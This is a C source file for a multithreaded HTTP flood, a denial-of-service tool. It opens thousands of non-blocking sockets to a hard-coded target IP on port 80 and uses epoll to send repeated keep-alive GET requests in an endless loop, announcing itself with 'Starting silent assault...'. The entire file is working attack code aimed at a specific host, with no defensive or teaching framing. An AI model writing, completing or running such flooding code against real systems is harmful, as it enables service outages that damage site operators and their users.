#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <threads.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

#define TARGET_IP "50.7.24.50"
#define TARGET_PORT 80
#define NUM_THREADS 4
#define CONNECTIONS_PER_THREAD 1250
#define EPOLL_MAX_EVENTS 128

const char HTTP_REQUEST[] =
    "GET / HTTP/1.1\r\n"
    "Host: " TARGET_IP "\r\n"
    "Connection: Keep-Alive\r\n\r\n";

static volatile bool running = true;

void signal_handler(int signum) {
    running = false;
}

int make_socket_non_blocking(int sfd) {
    int flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) {
        return -1;
    }
    flags |= O_NONBLOCK;
    if (fcntl(sfd, F_SETFL, flags) == -1) {
        return -1;
    }
    return 0;
}

int worker_function(void* arg) {
    struct epoll_event event;
    struct epoll_event* events;

    int* sockets = malloc(sizeof(int) * CONNECTIONS_PER_THREAD);
    if (!sockets) {
        return thrd_error;
    }

    events = calloc(EPOLL_MAX_EVENTS, sizeof(struct epoll_event));
    if (!events) {
        free(sockets);
        return thrd_error;
    }

    int epollfd = epoll_create1(0);
    if (epollfd == -1) {
        free(sockets);
        free(events);
        return thrd_error;
    }

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(TARGET_PORT);
    if (inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr) <= 0) {
        close(epollfd);
        free(sockets);
        free(events);
        return thrd_error;
    }

    for (int i = 0; i < CONNECTIONS_PER_THREAD; ++i) {
        if (!running) break;

        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (sockets[i] == -1) {
            continue;
        }

        make_socket_non_blocking(sockets[i]);
        
        connect(sockets[i], (struct sockaddr*)&serv_addr, sizeof(serv_addr));

        event.data.fd = sockets[i];
        event.events = EPOLLOUT;
        epoll_ctl(epollfd, EPOLL_CTL_ADD, sockets[i], &event);
    }

    while (running) {
        int n = epoll_wait(epollfd, events, EPOLL_MAX_EVENTS, -1);
        for (int i = 0; i < n; ++i) {
            send(events[i].data.fd, HTTP_REQUEST, sizeof(HTTP_REQUEST) - 1, MSG_NOSIGNAL);
        }
    }

    for (int i = 0; i < CONNECTIONS_PER_THREAD; ++i) {
        if (sockets[i] != -1) {
            close(sockets[i]);
        }
    }
    close(epollfd);
    free(sockets);
    free(events);
    return thrd_success;
}

int main() {
    signal(SIGINT, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    printf("Starting silent assault...\n");

    thrd_t threads[NUM_THREADS];
    
    for (int i = 0; i < NUM_THREADS; ++i) {
        if (thrd_create(&threads[i], worker_function, NULL) != thrd_success) {
            return 1;
        }
    }
    
    for (int i = 0; i < NUM_THREADS; ++i) {
        thrd_join(threads[i], NULL);
    }

    return 0;
}
